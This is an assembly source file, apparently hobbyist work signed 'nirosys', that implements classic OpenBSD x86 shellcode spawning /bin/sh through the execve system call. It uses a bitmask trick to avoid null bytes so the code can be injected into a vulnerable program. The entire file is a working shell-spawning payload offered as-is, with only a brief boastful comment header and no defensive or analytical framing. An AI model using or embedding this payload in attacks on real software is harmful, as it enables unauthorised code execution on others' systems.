/* nirosys <0xcd80>
 * * * * * * * * * * * * *
 * Traditional execve("/bin/sh",{"/bin/sh",NULL},NULL);
 * * * * * * * * * * * * *
 * Been there done that.. yea.. I know..
 * Who cares?..
 *
 * I wanted to code it, so I did. No big deal.
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

.data
.NAME:
	.ascii "CD80-oBSD-sh.s"

.text
.globl	_start

_start:
	movl	$0x2368732f, %eax /* "/sh#"  0x2f736823 */ 
	andl	$0xdc68732f, %eax /* ="/sh\0" 0x2f736800 */
	pushl	%eax	  	  /* Push "/sh" onto the stack */	
	pushl	$0x6e69622f	  /* Push "/bin" onto the stack */
	movl	%esp, %ebx	  /* Save address to "/bin/sh" */
	xorl	%eax, %eax        /* We need a NULL */
	pushl	%eax	          /* Creating the arg array, NULL term */	
	pushl	%ebx              /* First index, "/bin/sh" */	
	movl	%esp, %ecx	  /* Save address of array */
	pushl	%eax		  /* Last argument to execve, NULL (envp) */
	pushl	%ecx		  /* Second argument ptr to array (argp) */
	pushl	%ebx              /* First argument, path ("/bin/sh") */	
	movb	$0x3b, %al        /* Numeric for execve syscall */	
	pushl	%eax	    	  /* BSD calling convention garbage */	
	int	$0x80		  /* 0xCD80! W00t!! */
